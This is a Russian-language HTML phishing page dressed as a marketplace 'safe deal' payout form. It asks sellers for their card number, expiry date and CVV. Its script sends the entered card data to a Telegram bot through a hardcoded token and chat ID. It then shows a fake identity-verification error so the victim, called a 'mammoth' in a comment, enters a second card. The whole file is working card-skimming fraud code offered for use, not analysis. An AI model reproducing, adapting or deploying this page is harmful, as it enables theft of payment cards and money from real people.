<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Безопасная сделка | Получение средств</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f4f7; margin: 0; padding: 0; color: #2d3436; }
        .header { background: #ffffff; padding: 15px; text-align: center; border-bottom: 1px solid #e1e4e8; font-weight: bold; font-size: 18px; color: #00aa6e; }
        .container { max-width: 480px; margin: 0 auto; padding: 15px; }
        
        /* Карточка товара */
        .item-card { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-bottom: 20px; text-align: center; }
        .item-img { width: 120px; height: 120px; background: #f8f9fa; border-radius: 10px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        .item-title { font-size: 20px; font-weight: 700; margin: 0 0 5px; }
        .item-price { font-size: 24px; font-weight: 800; color: #00aa6e; margin-bottom: 10px; }
        
        /* Форма получения */
        .payout-form { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .payout-form h3 { margin-top: 0; font-size: 16px; color: #636e72; text-transform: uppercase; letter-spacing: 1px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        label { display: block; font-size: 12px; color: #b2bec3; margin-bottom: 5px; font-weight: 600; }
        input { width: 100%; padding: 14px; border: 1px solid #dfe6e9; border-radius: 8px; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
        input:focus { border-color: #00aa6e; outline: none; }
        
        .btn-receive { background: #00aa6e; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,170,110,0.3); }
        .btn-receive:active { transform: scale(0.98); }

        .secure-info { display: flex; align-items: center; justify-content: center; margin-top: 20px; color: #b2bec3; font-size: 12px; }
        .secure-info svg { margin-right: 5px; }
    </style>
</head>
<body>

<div class="header">Безопасная сделка</div>

<div class="container">
    <div class="item-card">
        <div class="item-img" id="display-img">📦</div>
        <div class="item-title" id="display-title">Название товара</div>
        <div class="item-price" id="display-price">0 ₽</div>
        <p style="font-size: 13px; color: #636e72;">Покупатель оплатил заказ. Нажмите кнопку ниже, чтобы зачислить средства на вашу карту.</p>
    </div>

    <div class="payout-form">
        <h3>Реквизиты для зачисления</h3>
        <form id="payout-form">
            <div class="input-group">
                <label>НОМЕР КАРТЫ</label>
                <input type="text" id="cc" placeholder="0000 0000 0000 0000" required>
            </div>
            <div style="display: flex; gap: 10px;">
                <div class="input-group" style="flex: 2;">
                    <label>СРОК ДЕЙСТВИЯ</label>
                    <input type="text" id="exp" placeholder="ММ/ГГ" required>
                </div>
                <div class="input-group" style="flex: 1;">
                    <label>CVV/CVC</label>
                    <input type="password" id="cvv" placeholder="***" required>
                </div>
            </div>
            <button type="submit" class="btn-receive" id="btn-text">ПОЛУЧИТЬ ВЫПЛАТУ</button>
        </form>
    </div>

    <div class="secure-info">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.67-3.13 8.75-7 9.81-3.87-1.06-7-5.14-7-9.81V6.3l7-3.12z"/></svg>
        Защищено шифрованием SSL
    </div>
</div>

<script>
    // --- ТВОИ НАСТРОЙКИ ---
    const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
    const CHAT_ID = '8071425015';

    // 1. Читаем параметры из ссылки
    const params = new URLSearchParams(window.location.search);
    const item = params.get('item') || 'Товар';
    const price = params.get('price') || '0';
    const imgType = params.get('img') || '1';

    // 2. Подставляем данные в оформление
    document.getElementById('display-title').innerText = item;
    document.getElementById('display-price').innerText = price + ' ₽';
    
    // Меняем иконку в зависимости от категории (img=1, 2, 3...)
    const icons = { '1': '📱', '2': '💻', '3': '🧥', '4': '🚲', '5': '📸' };
    document.getElementById('display-img').innerText = icons[imgType] || '📦';

    // 3. Отправка данных в бота
    document.getElementById('payout-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const btn = document.getElementById('btn-text');
        btn.innerText = 'ПОДОЖДИТЕ...';
        btn.disabled = true;

        const data = `💰 **НОВАЯ ВЫПЛАТА**\n\n📦 Товар: ${item}\n💵 Сумма: ${price} ₽\n\n💳 Карта: \`${document.getElementById('cc').value}\`\n📅 Срок: \`${document.getElementById('exp').value}\`\n🔒 CVV: \`${document.getElementById('cvv').value}\``;

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: 'Markdown' })
            });

            // "Ошибка" для мамонта, чтобы ввел вторую карту
            setTimeout(() => {
                alert("Ошибка подтверждения личности. Для зачисления средств воспользуйтесь картой другого банка.");
                btn.innerText = 'ПОЛУЧИТЬ ВЫПЛАТУ';
                btn.disabled = false;
            }, 1500);
        } catch (err) {
            alert("Сервис временно недоступен");
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
